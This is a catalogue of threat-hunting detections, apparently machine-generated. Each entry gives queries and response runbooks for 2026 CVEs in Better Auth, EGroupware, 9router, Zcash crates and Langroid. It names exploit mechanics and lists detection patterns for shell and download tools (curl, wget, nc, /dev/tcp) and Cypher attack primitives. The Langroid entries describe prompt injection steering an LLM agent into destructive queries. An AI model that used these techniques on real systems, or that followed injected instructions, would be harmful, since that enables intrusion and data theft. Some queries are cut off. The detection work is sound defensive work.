Better Auth OAuth refresh_token grant replayed without client_secret (CVE-2026-53512) AIExploitation Medium
Hunts POST requests to the Better Auth legacy token endpoints (/api/auth/oauth2/token, /api/auth/mcp/token) that carry a refresh_token grant but present no client authentication (no Basic/Bearer Authorization header) and still receive a 200. Because these plugins never verify a confidential client's client_secret on the refresh path, a leaked refresh_token + public client_id lets an attacker mint tokens indefinitely via repeated rotation. Rationale: Uses the exact vulnerable endpoints (/api/auth/oauth2/token, /api/auth/mcp/token), the refresh path's missing Authorization header, and the rotation-replay behaviour (repeated 200s) described in CVE-2026-53512. Defender/Falcon/CloudTrail left empty — this is self-hosted Node HTTP telemetry those platforms don't ship. Cross-checked against: • https://advisories.gitlab.com/npm/better-auth/CVE-2026-53512/ • https://github.com/advisories/GHSA-5rr4-8452-hf4v
ATT&CKT1528 T1212
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate PUBLIC clients (SPA/native + PKCE) correctly send no Authorization header on refresh — indistinguishable at the log layer without the oauthApplication client-type list
  • Aggressive mobile apps refreshing short-lived tokens every few minutes hit the >=3/hr threshold
  • Server-to-server integrations that place client_id/secret in the POST body rather than the Authorization header
  • Load-balancer or synthetic-monitoring probes that replay a stored refresh_token
Suppression filter
| where isnotempty(HttpRequestHeaderUserAgent) and HttpRequestHeaderUserAgent !has "HealthCheck" and HttpRequestHeaderUserAgent !has "Datadog"
Response runbook
1) Triage: pull the SrcIpAddr's full session and resolve the client_id being used; check the oauthApplication table — if that client's type is web/native/user-agent-based (confidential) it should NEVER refresh without client_secret, confirming abuse. 2) Contain: revoke the affected refresh chain — run db.deleteMany({model:"oauthAccessToken", where:[{field:"clientId", value: THAT_CLIENT_ID}]}) to invalidate all refresh tokens for the client, then rotate the client_secret. 3) Hunt: search for how the refresh_token leaked — XSS/log-capture/DB read; review the same SrcIp for prior /sso/register SSRF or access-token use at the victim user's scope.
let TokenEndpoints = dynamic(["/api/auth/oauth2/token","/api/auth/mcp/token"]);
ImWebSession
| where TimeGenerated > ago(7d)
| where HttpMethod == "POST"
| where Url has_any (TokenEndpoints)
| where isempty(HttpRequestHeaderAuthorization)   // no Basic/Bearer client auth on the refresh path
| where HttpStatusCode == 200                      // 200 == tokens minted successfully
| summarize Requests = count(), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated), Endpoints = make_set(Url) by SrcIpAddr, HttpRequestHeaderUserAgent
| where Requests >= 3    // 3+ = rotation replay: attacker re-redeems the rotated refresh_token repeatedly
| order by Requests desc

SSRF via Better Auth SSO provider registration to internal endpoints (CVE-2026-53513) AIExploitation Medium
Detects the server-side fetch primitive behind CVE-2026-53513: with skipDiscovery:true, POST /sso/register and /sso/update-provider persist attacker-supplied oidcConfig.userInfoEndpoint/tokenEndpoint/jwksEndpoint URLs, which better-auth then fetches server-side during the OIDC callback. Surfaces the auth tier making outbound OIDC-shaped HTTP requests to RFC1918/loopback/link-local addresses. Rationale: Grounded in the corroborated CVE-2026-53513 mechanism: skipDiscovery:true + attacker-controlled oidcConfig endpoints on /sso/register and /sso/update-provider drive server-side fetches; the high-fidelity pivot is the auth tier fetching OIDC paths against private IP space. Defender/Falcon/CloudTrail empty — no web-egress equivalent for a self-hosted Node app in those feeds. Cross-checked against: • https://advisories.gitlab.com/npm/@better-auth/sso/CVE-2026-53513/ • https://better-auth.com/docs/plugins/sso
ATT&CKT1190
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimately configured on-prem/internal IdP where the OIDC endpoints genuinely live on RFC1918 addresses (internal SSO)
  • Service-mesh/sidecar architectures where the app reaches an internal OIDC proxy at 127.0.0.1 or a cluster IP
  • Internal integration testing/staging registering a mock OIDC provider on a private host
  • Cloud metadata probes (169.254.169.254) from unrelated legitimate SDK calls sharing the proxy
Suppression filter
| where DstIpAddr != "127.0.0.1" and not (ipv4_is_in_range(DstIpAddr, "169.254.169.254/32") and isempty(SrcHostname))
Response runbook
1) Triage: pull the ssoProvider row(s) created/updated around the fetch and inspect oidcConfig.userInfoEndpoint/tokenEndpoint/jwksEndpoint — internal IPs, 127.0.0.1, or 169.254.169.254 confirm SSRF; note the authenticated session that called /sso/register. 2) Contain: delete/disable the malicious ssoProvider entries, block that session/user, and upgrade better-auth to >=1.6.11 (adds the public-routable host allowlist). 3) Hunt: review what the server-side fetch returned (reflected into user profile = non-blind SSRF) for cloud-metadata credentials or internal service data; check whether stolen metadata creds were then used against your cloud control plane.
ImWebSession
| where TimeGenerated > ago(7d)
| where isnotempty(DstIpAddr)
| where ipv4_is_private(DstIpAddr) or ipv4_is_in_range(DstIpAddr, "127.0.0.0/8") or ipv4_is_in_range(DstIpAddr, "169.254.0.0/16")
| where Url has_any ("/.well-known/openid-configuration","userinfo","jwks","/token","oauth")   // OIDC fetch shapes reachable via a forged provider config
| summarize Fetches = count(), Paths = make_set(Url), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated) by SrcHostname, SrcIpAddr, DstIpAddr, DstPortNumber
| order by Fetches desc

Better Auth OIDC discovery probe followed by token/registration endpoint access (CVE-2026-53512/53513 recon) AIReconnaissance Low
Correlates a source that requests the OIDC discovery document (/.well-known/openid-configuration) and then, within 30 minutes, hits a sensitive Better Auth endpoint (/api/auth/oauth2/token, /api/auth/mcp/token, or /sso/register). Aims to catch pre-exploitation fingerprinting of grant types and endpoints preceding refresh-token replay or SSRF registration. Rationale: Chains the discovery-document probe to sensitive endpoint access from the same source within a tight window, reducing the enormous baseline noise of standalone /.well-known/openid-configuration requests. Explicitly low-confidence/hunting because the article body does not describe recon and the discovery doc is legitimately fetched by every SSO integration. Cross-checked against: • https://advisories.gitlab.com/npm/better-auth/CVE-2026-53512/ • https://better-auth.com/docs/plugins/oidc-provider
ATT&CKT1595.002 T1190
Data sourcesWeb.Web
Expected false positives · estimated rate: high — model-assessed, tune to your environment
  • Every legitimate relying-party/SSO client fetches /.well-known/openid-configuration then calls /token as normal OAuth flow — this is the dominant FP
  • OIDC library cold-starts that refresh the discovery cache then immediately exchange tokens
  • Uptime/synthetic monitors polling discovery and token endpoints in sequence
  • Mobile SDKs that re-read discovery on app launch before refresh
Response runbook
1) Triage: determine whether the SrcIp maps to a known registered relying party/client_id; a legitimate client will resolve cleanly, an unknown/external IP walking multiple endpoints will not. 2) Contain: if the source is unrecognised and followed the probe with a 200 on /token or a /sso/register POST, treat as UC1/UC2 and revoke the client's refresh chain / delete the ssoProvider row. 3) Hunt: pivot the SrcIp across UC1 (refresh replay) and UC2 (SSRF egress to private IPs) to confirm whether recon converted to exploitation.
let Window = 30m;
let Probes = ImWebSession
    | where TimeGenerated > ago(7d)
    | where Url has "/.well-known/openid-configuration"
    | project ProbeTime = TimeGenerated, SrcIpAddr, ProbeUrl = Url;
ImWebSession
| where TimeGenerated > ago(7d)
| where Url has_any ("/api/auth/oauth2/token","/api/auth/mcp/token","/sso/register")
| join kind=inner Probes on SrcIpAddr
| where TimeGenerated between (ProbeTime .. ProbeTime + Window)
| project ProbeTime, AccessTime = TimeGenerated, SrcIpAddr, ProbeUrl, TargetUrl = Url, HttpMethod, HttpStatusCode
| order by AccessTime desc

EGroupware CVE-2026-27823 arbitrary file read via importexport download path traversal AIExploitation High
Hunts inbound HTTP requests to the EGroupware importexport export handler carrying a traversal-laden _filename parameter. This is the arbitrary-file-read primitive attackers use to exfiltrate a valid header.inc.php before overwriting it for RCE — article-specific because it pins the exact vulnerable menuaction and parameter. Rationale: Anchors on the exact vulnerable menuaction 'importexport.importexport_export_ui.download' plus a path-traversal _filename token straight from the advisory's PoC URL — the pair is not something benign EGroupware traffic produces. Cross-checked against: • https://github.com/advisories/GHSA-h9qx-v5xp-ph8p • https://www.cvedetails.com/vulnerability-list/vendor_id-2373/Egroupware.html
ATT&CKT1190 T1083
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Vulnerability scanners (Nessus/Qualys/Nuclei) probing EGroupware with traversal templates
  • Internal pentest or red-team validation of CVE-2026-27823
  • Security researcher testing after patch to confirm remediation
  • WAF in monitor-mode logging blocked-then-passed requests
Suppression filter
| where HttpStatusCode == 200
Response runbook
1) TRIAGE: Confirm the HTTP status — a 200 with a non-trivial response body means the file read succeeded; extract SrcIpAddr and check whether _filename resolved to header.inc.php or another sensitive file. 2) CONTAIN: Block the source IP at the WAF/edge and confirm EGroupware is patched (>= 26.2.20260224 / >= 23.1.20260224); disable user self-registration if enabled. 3) HUNT: Pivot on the same SrcIpAddr for subsequent POST uploads to the SmallPart media recorder and for any modification of header.inc.php on the host.
ImWebSession
| where TimeGenerated > ago(7d)
| where Url has "menuaction=importexport.importexport_export_ui.download"
| where Url has_any ("_filename=../", "_filename=..%2f", "%2e%2e%2f", "..%5c", "header.inc.php")
| project TimeGenerated, SrcIpAddr, DstHostname, HttpMethod, HttpStatusCode, Url
| order by TimeGenerated desc

EGroupware header.inc.php overwritten by web process (CVE-2026-27823 RCE persistence) AIInstallation High
Detects the web/PHP runtime writing or modifying header.inc.php — EGroupware's core bootstrap config, which is normally only written during setup. In CVE-2026-27823 the auth-bypass file-write primitive overwrites this file with attacker PHP to achieve RCE on restart/OPcache expiry. Rationale: header.inc.php is EGroupware's bootstrap config; a write to it by php/php-fpm/apache at runtime (not during setup) is the exact RCE persistence artifact named in the advisory. Filename + web-process parent make it very high-fidelity. Cross-checked against: • https://github.com/advisories/GHSA-h9qx-v5xp-ph8p
ATT&CKT1505.003 T1190
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate EGroupware setup/reconfiguration wizard writing header.inc.php
  • Admin editing config via the setup UI after an upgrade
  • Automated deployment/config-management (Ansible/Puppet) templating header.inc.php — but that runs as a deploy user, not php-fpm
  • Package upgrade regenerating the config file
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("setup","cli.php","doctrine") )
Response runbook
1) TRIAGE: Diff the new header.inc.php against a known-good copy; look for injected PHP (system/exec/passthru, base64 blobs, added functions) beyond the expected config array. 2) CONTAIN: Restore header.inc.php from backup, kill the php-fpm/apache workers, and take the host off the network if injected code is present. 3) HUNT: Search DeviceProcessEvents for php-fpm/apache spawning shells or network tools, and review web logs for the preceding SmallPart ajax_upload POST and importexport file-read that seeded the attack.
DeviceFileEvents
| where Timestamp > ago(7d)
| where FileName =~ "header.inc.php"
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where InitiatingProcessFileName in~ ("php","php-fpm","php-fpm8","apache2","httpd","nginx") or InitiatingProcessFolderPath has_any ("/var/www","/usr/share/egroupware")
| project Timestamp, DeviceName, FileName, FolderPath, ActionType, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where TargetFileName =~ "header.inc.php"
| where EventType in ("FileCreated","FileModified","FileRenamed")
| where ActingProcessName has_any ("php","php-fpm","apache2","httpd","nginx")
| project TimeGenerated, DvcHostname, TargetFilePath, TargetFileName, EventType, ActingProcessName, ActingProcessCommandLine, ActorUsername
| order by TimeGenerated desc

EGroupware web runtime (php-fpm/apache) spawning a shell or network tool — CVE-2026-27823 RCE execution AIActions on Objectives Medium
Hunts the PHP/web server process spawning interactive shells or download utilities, the observable execution stage once CVE-2026-27823's poisoned header.inc.php runs. Article-specific because EGroupware executes as www-data under php-fpm/apache, so shell children of that process are anomalous. Rationale: The advisory states EGroupware runs as www-data under the web server and achieves RCE via header.inc.php; a php-fpm/apache parent spawning a shell or curl/wget is the direct execution signature of that RCE, keyed on the runtime's own process names. Cross-checked against: • https://github.com/advisories/GHSA-h9qx-v5xp-ph8p
ATT&CKT1059.004 T1505.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • EGroupware cron/async jobs invoking php CLI that shells out (e.g. mail delivery, LDAP sync)
  • Server monitoring plugins run under the web user calling id/uname/whoami
  • ImageMagick/document-conversion features legitimately calling helper binaries
  • Deployment hooks or health-checks executed by the web process during restart
Suppression filter
| where ProcessCommandLine has_any ("-c ","/tmp/","http://","https://","/dev/tcp","base64","-i")
Response runbook
1) TRIAGE: Inspect ProcessCommandLine of the child — reverse-shell one-liners, curl|bash to external IPs, or recon (id;uname -a) are true-positive; a known EGroupware maintenance task is benign. 2) CONTAIN: Isolate the host, capture the php-fpm/apache process tree, and rotate EGroupware admin/setup credentials (advisory notes setup-password modification as an alternative impact). 3) HUNT: Correlate back to the header.inc.php write and the importexport file-read/SmallPart upload from the same host/IP, and scan for outbound C2 from the web process.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("php","php-fpm","php-fpm8","apache2","httpd","nginx")
| where FileName in~ ("sh","bash","dash","curl","wget","python","python3","perl","nc","ncat","whoami","id","uname")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("php","php-fpm","apache2","httpd","nginx")
| where ActingProcessName has_any ("/sh","/bash","/dash","/curl","/wget","/python","/perl","/nc","/ncat","/whoami","/id","/uname")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

9router credential dump via GET /api/settings/database (CVE-2026-55500) AIActions on Objectives High
Hunts successful HTTP GET requests to the 9router /api/settings/database export endpoint, which returns the full database including plaintext API keys, OAuth tokens and OIDC client secrets. Any 200 response to this path is a complete credential exposure and should never occur from a remote client in normal operation. Rationale: Pivots on the exact vulnerable path '/api/settings/database' with method=GET and a 200 response — the export sink named in the advisory (route.js exportDb()). Excluding loopback removes legitimate local CLI-token backups; remote (tunnel-exposed) exploitation shows a public source IP. Defender/Datadog/Falcon/CloudWatch left empty as none ingest this app's HTTP request path. Cross-checked against: • https://nvd.nist.gov/vuln/detail/CVE-2026-55500 • https://advisories.gitlab.com/npm/9router/CVE-2026-55500/ • https://www.thehackerwire.com/9router-unauthenticated-database-export-import/
ATT&CKT1190 T1552.001
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Authorized administrator exporting the database for backup or migration from a management workstation
  • Scheduled backup automation hitting the endpoint from a fixed internal host
  • Authorized penetration test / vulnerability scan enumerating API routes
  • Uptime/health-monitoring probe configured against the settings API path
Suppression filter
| where cIP !in ("127.0.0.1", "::1")
Response runbook
1) Triage: Identify the source IP (cIP) and user-agent; determine if it is an internal management host or an unrecognised/tunnel-exposed remote address. Check response size (scBytes) — a large body confirms a full DB dump was returned. 2) Contain: Treat ALL stored secrets as compromised — rotate every API key, OAuth token and OIDC client secret in the 9router config, and upgrade 9router to >=0.4.80. Restrict the /api/settings/database route at the reverse proxy/WAF. 3) Hunt: Search for a subsequent POST to the same path (malicious import), and hunt for use of the leaked API keys/OAuth tokens against downstream provider APIs from new IPs.
W3CIISLog
| where TimeGenerated > ago(24h)
| where csUriStem =~ "/api/settings/database"
| where csMethod =~ "GET"
| where toint(scStatus) == 200
// exclude local CLI-token backups that run on the appliance itself (loopback)
| where cIP !in ("127.0.0.1", "::1")
| project TimeGenerated, Computer, cIP, csMethod, csUriStem, StatusCode=scStatus, RespBytes=scBytes, csUserAgent, csUserName
| order by TimeGenerated desc

9router database overwrite via POST /api/settings/database (CVE-2026-55500) AIActions on Objectives High
Hunts successful HTTP POST requests to the 9router /api/settings/database import endpoint, which performs a full wipe-and-replace of all tables (settings, apiKeys, providerConnections, password hash). A POST here lets an attacker overwrite the admin password and destroy or manipulate stored data. Rationale: Pivots on the vulnerable path with method=POST (importDb() wipe-and-replace, lines 102-163) and a success status. A POST to this route is far rarer than a read and directly maps to database takeover / destruction; large csBytes indicates an attacker-supplied DB body. Non-web platforms left empty (no HTTP-path telemetry). Cross-checked against: • https://nvd.nist.gov/vuln/detail/CVE-2026-55500 • https://advisories.gitlab.com/npm/9router/CVE-2026-55500/
ATT&CKT1565.001 T1485
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Administrator restoring the database from a backup after an outage
  • Migration tooling importing config when moving 9router between hosts
  • Authorized DR/restore drill
  • Automated config-provisioning pipeline pushing a known-good settings blob
Suppression filter
| where cIP !in ("127.0.0.1", "::1")
Response runbook
1) Triage: Confirm the source IP is not an approved admin/restore host and inspect csBytes for a large attacker-supplied payload. Check whether the admin can still authenticate (password hash may have been overwritten). 2) Contain: Isolate the 9router instance, block the source at the proxy/WAF, restore from a known-good backup, force-rotate the admin password and all secrets, and upgrade to >=0.4.80. 3) Hunt: Look for a preceding GET export from the same IP (credential theft before overwrite) and for logon/API activity using any credentials that existed before the import.

| order by TimeGenerated desc

9router export-then-import chain from same source (CVE-2026-55500 takeover) AIActions on Objectives High
Correlates a GET export of /api/settings/database followed by a POST import from the same source IP within 10 minutes — the full 'steal-credentials-then-overwrite/takeover' sequence. This chain is the highest-fidelity signal that the CVE-2026-55500 flaw is being actively weaponised rather than merely probed. Rationale: Time-window join of the two named path/method pairs (GET-200 export → POST-2xx import) from one source IP within 10 minutes captures the full attack chain the advisory describes and is essentially FP-free versus a lone read. No Sigma (multi-event correlation); non-web platforms left empty. Cross-checked against: • https://nvd.nist.gov/vuln/detail/CVE-2026-55500 • https://www.thehackerwire.com/9router-unauthenticated-database-export-import/
ATT&CKT1190 T1565.001
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Admin exporting then re-importing during a config migration test from one workstation
  • Backup-then-restore validation run inside the 10-minute window
  • Blue-team validation of the patch reproducing the export/import flow
  • Automation that snapshots then re-seeds config on the same host
Response runbook
1) Triage: Review the export and import records for the correlated cIP; confirm it is not an approved migration/backup host and compare the import payload size to expected config size. 2) Contain: Isolate the instance, block the source IP, restore from a pre-incident backup, rotate every secret and the admin password, and upgrade to >=0.4.80. 3) Hunt: Enumerate all API keys/OAuth tokens that were present at export time and hunt downstream provider logs for their use from unfamiliar IPs; check for new/altered admin accounts created via the import.

let exports = W3CIISLog

    | project ExportTime = TimeGenerated, cIP, Computer;

| project cIP, Computer, ExportTime, ImportTime, DelaySec = datetime_diff('second', ImportTime, ExportTime), csUserAgent
| order by ImportTime desc

9router token brute-force burst against /api/settings/database (CVE-2026-55500) AIExploitation Medium
Detects a burst of failed (401/403) requests to /api/settings/database from a single source followed by a success (200), consistent with guessing or enumerating a weak JWT/CLI token to defeat the ALWAYS_PROTECTED middleware. Targets the token-validation weakness noted in the advisory. Rationale: Thresholded correlation (>=50 auth failures then a success) on the vulnerable path directly targets the advisory's weak 'validates JWT or CLI token' gate. Threshold + temporal ordering can't be expressed in single-event Sigma; non-web platforms lack the HTTP status telemetry so left empty. Cross-checked against: • https://nvd.nist.gov/vuln/detail/CVE-2026-55500 • https://advisories.gitlab.com/npm/9router/CVE-2026-55500/
ATT&CKT1110.003 T1190
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A monitoring agent with an expired token repeatedly hitting the API until it is refreshed
  • Load balancer / uptime checks generating many 401s before valid creds are configured
  • Legitimate client with clock skew causing JWT exp validation failures then recovery
  • A CI job with a rotated-but-not-yet-updated CLI token retrying the endpoint
Response runbook
1) Triage: Confirm the failing source IP is external/unrecognised and inspect the timing pattern of the 401/403 burst (regular vs randomised) and the exact request that returned 200. 2) Contain: Block the source IP at the proxy/WAF, invalidate/rotate all JWT and CLI tokens, and upgrade to >=0.4.80 which requires re-authentication for this route. 3) Hunt: For the source that eventually succeeded, look for the subsequent GET export and POST import on the same path, and rotate any secrets that were exposed once access was achieved.
W3CIISLog
| where TimeGenerated > ago(24h)
| where csUriStem =~ "/api/settings/database"
| summarize
    Failures   = countif(toint(scStatus) in (401,403)),
    Successes  = countif(toint(scStatus) == 200),
    FirstFail  = minif(TimeGenerated, toint(scStatus) in (401,403)),
    LastSuccess= maxif(TimeGenerated, toint(scStatus) == 200),
    Methods    = make_set(csMethod)
    by cIP, bin(TimeGenerated, 5m)
| where Failures >= 50 and Successes >= 1 and LastSuccess > FirstFail   // 50 = burst threshold; success after failures = likely token found
| order by Failures desc

Vulnerable Zcash node software present (CVE-2026-54496 / pre-NU6.2 zcashd & zebrad) AIExploitation High
Surfaces managed hosts running Zcash full-node software affected by the halo2_gadgets Orchard soundness bug: zcashd < 6.20.0 and zebrad < 5.0.0, or any asset flagged for CVE-2026-54496. This is a vulnerability-posture hunt, not exploit detection — the article confirms the actual double-spend is undetectable on-chain, so patch coverage is the only defensible signal. Rationale: Uses the exact affected-version thresholds from the advisory (zcashd < 6.20.0, zebrad < 5.0.0) and the CVE id CVE-2026-54496; corroborated by the Zcash Foundation NU6.2/Zebra 5.0.0 release notice. Vuln-posture is the only detectable surface since the advisory states the exploit is undetectable on-chain. Cross-checked against: • https://zfnd.org/zebra-4-5-3-and-5-0-0-emergency-soft-fork-and-nu6-2-activation/ • https://github.com/zcash/zcash/releases • https://github.com/advisories/GHSA-ww9q-8r59-xv46
ATT&CKT1195.001
Data sourcesVulnerabilities.Vulnerabilities
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Air-gapped / testnet-only Zcash nodes that operators intentionally keep on older builds
  • TVM catalog lag: a host patched to 6.20.0/5.0.0 but not yet rescanned still shows the CVE
  • Third-party wallet bundles that ship an embedded zcashd copy the operator can't independently update
  • Docker/container image layers cached with an old zebrad that is never actually run
Response runbook
1) Triage: confirm the flagged host actually runs a production Zcash node (check listening ports 8232/8233, running zebrad/zcashd process) vs a stale package. 2) Contain: for any live node still below zebrad 5.0.0 / zcashd 6.20.0, coordinate an immediate upgrade to the NU6.2 build and, if it validates Orchard actions, temporarily follow the vendor guidance to disable Orchard actions until patched. 3) Hunt: enumerate all other hosts in the org running these binaries (see companion process-execution UC) and cross-check developer machines for the vulnerable crate (companion cargo UC).

Execution of unpatched Zcash node binary (zebrad / zcashd / zcash-cli) AIExploitation Medium
Hunts process executions of Zcash node binaries so analysts can confirm which running nodes predate the NU6.2 fix. These binaries are rare on corporate endpoints, so surfacing every execution with its embedded product version and command line is a high-signal patch-coverage pivot that catches nodes TVM inventory may miss. Rationale: Targets the exact node binaries named in the advisory (zebrad, zcashd) plus the standard CLI companion; rare on endpoints so execution itself is the pivot, and the projected ProcessVersionInfoProductVersion lets the analyst confirm pre-NU6.2 builds without a hand-edited version filter. Cross-checked against: • https://zfnd.org/zebra-4-5-3-and-5-0-0-emergency-soft-fork-and-nu6-2-activation/ • https://github.com/zcash/zcash/releases
ATT&CKT1195.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate blockchain-team / treasury hosts that run a Zcash node as an approved business function
  • Already-patched nodes (zebrad 5.0.0+) — expected and benign, filter by version once confirmed
  • Wallet software that shells out to zcash-cli for balance queries
  • Security researchers running a node in a sandbox for analysis
Suppression filter
| where isempty(ProductVersion) or parse_version(ProductVersion) < parse_version("5.0.0")
Response runbook
1) Triage: read the projected ProductVersion/command line — is this node below zebrad 5.0.0 / zcashd 6.20.0 and is it a sanctioned host? 2) Contain: for unsanctioned or unpatched production nodes, isolate or coordinate an emergency upgrade to the NU6.2 build; if the node participates in consensus, apply vendor mitigation (disable Orchard actions) until upgraded. 3) Hunt: pivot on the host for the cargo crate exposure UC and check DeviceNetworkEvents for peer connections on 8233 to map the node's role.

Vulnerable halo2_gadgets / orchard / zcash_primitives crate unpacked in cargo dirs AIDelivery Medium
Detects developer or CI/CD hosts that have the vulnerable Rust crates unpacked in the cargo registry or a vendored dependency tree — the crate version is embedded in the directory name (e.g. halo2_gadgets-0.4.0). Flags halo2_gadgets < 0.5.0, orchard < 0.14.0, and zcash_primitives < 0.28.0, the exact affected ranges from the advisory, so teams building on the Zcash stack can find pre-fix supply-chain exposure. Rationale: Cargo unpacks registry crates into version-named directories, so the vulnerable ranges from the advisory (halo2_gadgets<0.5.0, orchard<0.14.0, zcash_primitives<0.28.0) are matchable directly from FolderPath without file-content inspection; Datadog is left empty because its glob search bar cannot express these numeric version ranges. Corroborated by the crate fix versions in the Zcash Foundation notice. Cross-checked against: • https://github.com/advisories/GHSA-ww9q-8r59-xv46 • https://zfnd.org/zebra-4-5-3-and-5-0-0-emergency-soft-fork-and-nu6-2-activation/
ATT&CKT1195.001
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Cargo registry cache retains old crate versions after a project already upgraded — presence ≠ shipped build
  • Developers auditing/reproducing the bug intentionally pulling the pre-fix crate
  • Vendored monorepos keeping historical Cargo.lock trees for reproducibility
  • Rust security tooling (cargo-audit, RustSec advisory-db test fixtures) that clones vulnerable crates for testing
  • Cargo dependency of a dependency where only a transitive, unused old copy is cached
Response runbook
1) Triage: on the flagged dev/CI host, run `cargo tree -i halo2_gadgets` (and orchard) in the relevant repos to confirm whether the vulnerable crate is an active build dependency vs a stale registry cache. 2) Contain: for any project actively depending on the vulnerable range, bump to halo2_gadgets 0.5.0 / orchard 0.14.0 / zcash_primitives 0.28.0, regenerate Cargo.lock, and block the pre-fix versions in CI (deny-list or cargo-deny). 3) Hunt: check whether the same host also runs a node binary (companion UC) and review the repo's CI artifacts to ensure no vulnerable-circuit binary was published downstream.

Cypher injection primitives in Langroid LLM prompt / inbound HTTP input AIExploitation Low
Hunts Cypher control keywords (DETACH DELETE, LOAD CSV, CALL apoc/dbms) arriving in the LLM-facing input tier of a Langroid Neo4jChatAgent deployment before they reach the Neo4j driver. Article-specific because the injection vector is the prompt itself (direct user input or RAG-read content), and legitimate chat prompts virtually never contain raw Cypher admin verbs. Rationale: Targets the article's stated injection vector ('query text is influenceable by prompt injection, direct user input or indirect content the agent reads back via RAG') by matching the exact Cypher admin verbs (DETACH DELETE / LOAD CSV / CALL apoc / CALL dbms) in the input tier. Confidence is Low because LLM prompt bodies are often in POST payloads not captured by standard access logs; deploy where a WAF or app logger records request bodies. Cross-checked GitLab advisory and TheHackerWire. Cross-checked against: • https://advisories.gitlab.com/pypi/langroid/CVE-2026-55615/ • https://www.thehackerwire.com/langroid-sqlchatagent-rce-via-prompt-injection-cve-2026-25879/
ATT&CKT1190 T1059
Data sources
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Developer/QA testing the agent with legitimate Cypher examples in prompts
  • Documentation or tutorial content ingested via RAG that quotes Cypher syntax
  • Security team running this exact PoC against a disposable instance
  • Data-engineering chatbot where power users legitimately paste Cypher to run
  • Log-injection noise where an upstream error message echoes a prior query
Suppression filter
| where SourceIP != "127.0.0.1" and DestinationHostName !has "staging"
Response runbook
1) Triage: pull the full request/prompt and identify the source principal or RAG document that supplied the Cypher; confirm whether the agent is Neo4jChatAgent and its langroid version (<=0.65.4 is vulnerable). 2) Contain: if the source is external/untrusted, block it at the WAF and set allow_dangerous_operations=False (or upgrade to 0.65.5) so the CypherRetrievalTool is read-only. 3) Hunt: correlate the timestamp against Neo4j query.log for the same keywords executing (UC 'Dangerous Cypher primitives') to confirm the injection reached the driver.

| where RequestURL has_any ("DETACH DELETE","LOAD CSV","CALL apoc","CALL dbms","apoc.load","apoc.cypher")
     or Message has_any ("DETACH DELETE","LOAD CSV","CALL apoc","CALL dbms","apoc.load","apoc.cypher")
| project TimeGenerated, DeviceVendor, SourceIP, DestinationHostName, RequestURL, RequestMethod, Message
| order by TimeGenerated desc

index=langroid (sourcetype=nginx:plus:access OR sourcetype=langroid:app OR source=*langroid*) ("DETACH DELETE" OR "LOAD CSV" OR "CALL apoc" OR "CALL dbms" OR "apoc.load" OR "apoc.cypher")

Neo4j executes attacker-primitive Cypher (apoc.*, dbms.*, LOAD CSV) via query.log AIExploitation High
Detects the RCE/SSRF 'landing pad' primitives the advisory names — CALL apoc.load.*/apoc.cypher.runFile/apoc.import/apoc.export, CALL dbms.*, CALL db.*, and LOAD CSV — actually running inside Neo4j's query.log. This is the post-injection execution signal for CVE-2026-55615 where the unvalidated CypherCreationTool/CypherRetrievalTool query reaches session.run/tx.run. Rationale: Uses the advisory's explicitly named RCE-ceiling primitives (apoc.load.*, apoc.cypher.runFile, apoc.import/export, CALL dbms.*, CALL db.*, LOAD CSV) verbatim against Neo4j query.log — the exact strings the maintainer's 0.65.5 fix now blocks. High fidelity because a read-only Langroid role should never emit these. Defender/Falcon/CloudWatch empty: Neo4j query.log has no native Advanced Hunting / FDR / CloudTrail table; ship it as Syslog to Sentinel/Splunk/Datadog. Cross-checked against: • https://advisories.gitlab.com/pypi/langroid/CVE-2026-55615/ • https://neo4j.com/docs/cypher-manual/current/clauses/load-csv/
ATT&CKT1059 T1190
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment

  • DBA maintenance running CALL dbms.listQueries or CALL db.indexes for diagnostics
  • apoc.export.* used for approved graph backups
  • Application bootstrap importing seed data via apoc.import
  • GraphRAG pipeline that legitimately calls apoc.* for schema introspection
Suppression filter
| where ProcessName has "neo4j" and SyslogMessage !has "scheduler" and SyslogMessage !has "backup"
Response runbook
1) Triage: identify the Neo4j auth principal and whether it's the Langroid service account; check if the query originated from the agent's bolt session vs an interactive DBA session. 2) Contain: revoke apoc/dbms procedure rights from the Langroid DB role (least-privilege) and set allow_dangerous_operations=False or upgrade langroid to 0.65.5. 3) Hunt: for apoc.load/LOAD CSV lines, pivot to the Neo4j host's outbound connections (UC 'Neo4j server SSRF egress') to see if a remote URL was fetched, and check for filesystem writes from apoc.export/apoc.import.

| order by TimeGenerated desc

Neo4j server outbound egress to public IP (LOAD CSV / apoc.load SSRF) AICommand & Control Medium
